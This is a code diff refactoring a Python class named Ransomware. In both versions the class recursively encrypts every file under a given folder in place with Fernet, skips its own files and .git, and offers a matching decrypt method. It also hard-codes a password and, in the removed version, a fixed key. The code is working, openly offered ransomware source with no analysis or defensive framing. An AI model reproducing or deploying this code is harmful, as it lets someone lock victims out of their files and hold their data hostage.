@@ -1,64 +1,31 @@
-"""
-This is a simple ransomware script that encrypts all files in a folder and its subfolders.
-
-:Usage:
-    ::
-
-        from ransomware import Ransomware
-
-        ransomware = Ransomware()
-        ransomware.encrypt_files_in_folder("path/to/folder")
-        ransomware.decrypt_files_in_folder("path/to/folder")
-
-"""
-
 from pathlib import Path
-
-try:
-    from cryptography.fernet import Fernet
-except ModuleNotFoundError:
-    print(
-        "Please install the cryptography module using the command: pip install cryptography"
-    )
-    exit(0)
-
-red = "\033[91m"
-blue = "\033[94m"
+from cryptography.fernet import Fernet
 
 
 class Ransomware:
-    def __init__(self):
-        self.__secret_password = "11092005"
-        self.__secret_key = "ZTDagi0tH9njbS7ErAnZb1SSIYNHixW532VrJR7p-F8="
+    __red = "\033[91m"
+    __blue = "\033[94m"
+
+    def __init__(
+        self, password: str = "11092005", key: str | bytes | None = None
+    ) -> None:
+        self.__secret_password = password
+        self.__secret_key = key if key else Fernet.generate_key()
 
     @property
-    def password(self):
+    def password(self) -> str:
         return self.__secret_password
 
-    @password.setter
-    def password(self, passwd: str):
-        self.__secret_password = passwd
-
-    @property
-    def key(self) -> str | bytes:
-        return self.__secret_key
-
-    @key.setter
-    def key(self, key: str | bytes):
-        self.__secret_key = key
-
-    def generate_key(self) -> str:
-        return Fernet.generate_key()
-
-    def __process_file(self, file_path: str, key: str | bytes, mode: str) -> bool:
+    def __process_file(self, file_path: str, mode: str) -> bool:
         try:
             with open(file_path, "rb") as f:
                 data = f.read()
 
-            if mode == "encrypt":
-                processed_data = Fernet(key).encrypt(data)
-            elif mode == "decrypt":
-                processed_data = Fernet(key).decrypt(data)
+            processed_data = (
+                Fernet(self.__secret_key).encrypt(data)
+                if mode == "encrypt"
+                else Fernet(self.__secret_key).decrypt(data)
+            )
 
             with open(file_path, "wb") as f:
                 f.write(processed_data)
@@ -66,28 +33,37 @@ class Ransomware:
             return True
 
         except Exception as e:
-            print(f"{red}{e}")
+            print(f"{self.__red}{e}")
             return False
 
-    def __process_files_in_folder(self, folder_path: str, mode: str) -> None:
+    def __process_files_in_folder(self, path: str, mode: str) -> None:
+
+        def is_banned(item: Path) -> bool:
+            banned_folders = ["ransomware", ".git"]
+            return any(folder in item.parts for folder in banned_folders)
+
         try:
-            all_paths = Path(folder_path).rglob("*")
-            for current_path in all_paths:
-                if (
-                    "ransomware.py" in current_path.name
-                    or "main.py" in current_path.name
-                ):
+            path_obj = Path(path)
+            if not path_obj.exists():
+                print(f"{self.__red}Invalid path!")
+                return
+
+            for current_path in path_obj.rglob("*"):
+                if is_banned(current_path):
+                    print(f"{self.__red}Skipping processing for {current_path}")
                     continue
+
                 if current_path.is_file():
-                    if self.__process_file(current_path, self.__secret_key, mode):
-                        print(f"\n{blue}Successfully {mode}ed {current_path}")
+                    if self.__process_file(current_path, mode):
+                        print(f"{self.__blue}Successfully {mode}ed {current_path}")
                     else:
-                        print(f"{red}Failed to {mode} {current_path}")
+                        print(f"{self.__red}Failed to {mode} {current_path}")
+
         except Exception as e:
-            print(f"{red}{e}")
+            print(f"{self.__red}{e}")
 
-    def encrypt_files_in_folder(self, folder_path: str) -> None:
-        self.__process_files_in_folder(folder_path, "encrypt")
+    def encrypt_files_in_folder(self, path: str) -> None:
+        self.__process_files_in_folder(path, "encrypt")
 
-    def decrypt_files_in_folder(self, folder_path: str) -> None:
-        self.__process_files_in_folder(folder_path, "decrypt")
+    def decrypt_files_in_folder(self, path: str) -> None:
+        self.__process_files_in_folder(path, "decrypt")
